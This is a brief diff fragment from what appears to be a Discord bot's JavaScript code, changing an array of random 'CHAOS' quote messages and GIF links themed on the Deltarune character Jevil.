@@ -391,7 +391,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = [`CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+   var rand = ["CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS\nIsn't it lovely to be free?\nCHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-1.discordapp.net/external/8DHsw2FCYjn5MjW_8JrBuMP5jxaHxc-9yrEbwLlLIbo/https/c.tenor.com/OGC6jVC8GBgAAAAM/jevil-deltarune.gif", `CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
 
 Isn't it lovely to be free?
 
